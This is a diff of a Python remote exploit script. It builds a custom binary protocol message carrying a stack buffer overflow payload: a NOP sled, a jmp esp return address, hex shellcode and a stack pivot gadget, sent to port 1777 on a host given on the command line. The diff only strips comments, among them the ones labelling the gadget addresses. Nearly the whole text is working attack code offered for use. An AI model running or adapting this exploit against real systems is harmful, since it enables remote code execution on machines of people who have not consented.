@@ -2,7 +2,6 @@ import socket
 import struct
 import sys
 
-# Create an item structure for the header and payload
 class Item:
     def __init__(self, type_, name, value):
         self.type = type_
@@ -15,7 +14,6 @@ class Item:
         return struct.pack('>III{}s{}s'.format(self.name_size, self.value_size),
                            self.type, self.name_size, self.value_size, self.name, self.value)
 
-# Create a header structure
 class HP:
     def __init__(self, hdr, payload):
         self.hdr = hdr
@@ -26,18 +24,18 @@ class HP:
         return b''.join([item.pack() for item in self.hdr]) + \
                b''.join([item.pack() for item in self.payload]) + self.pad
 
-# Create a preamble structure
+
 class Preamble:
     def __init__(self, hp):
         self.msg_size = len(hp.pack()) + 16
         self.hdr_size = sum([len(item.pack()) for item in hp.hdr])
         self.payload_size = sum([len(item.pack()) for item in hp.payload])
-        self.unk = 0  # Unknown value
+        self.unk = 0  
 
     def pack(self):
         return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk)
 
-# Create a message structure
+
 class Msg:
     def __init__(self, hp):
         self.pre = Preamble(hp)
@@ -77,26 +75,24 @@ shellcode += b"95bd9dffd53c067c0a80fbe0"
 shellcode += b"7505bb4713726f6a0053ffd5"
 
 buf = b'90' * 340
-buf += b'812b4100' # jmp esp (0x00412b81)
+buf += b'812b4100' 
 buf += b'90909090'
 buf += b'90909090'
 buf += shellcode
 buf += b'41' * 80
-buf += b'84d45200' # stack pivot: add esp, 0x00000FA0 ; retn 0x0004 ; (0x0052d484)
+buf += b'84d45200' 
 buf += b'43' * (0x800 - len(buf))
 
 buf2 = b'41' * 0x1000
 
-# Create message payload
 hdr = [Item(3, "pwned", buf)]
-payload = [Item(3, "pwned", buf2)] # dummy payload, probabaly not necessary
+payload = [Item(3, "pwned", buf2)] 
 hp_instance = HP(hdr, payload)
 msg_instance = Msg(hp_instance)
 
-# Default port
 port = 1777
 
-# check for target host argument
+
 if len(sys.argv) > 1:
     host = sys.argv[1]
 else:
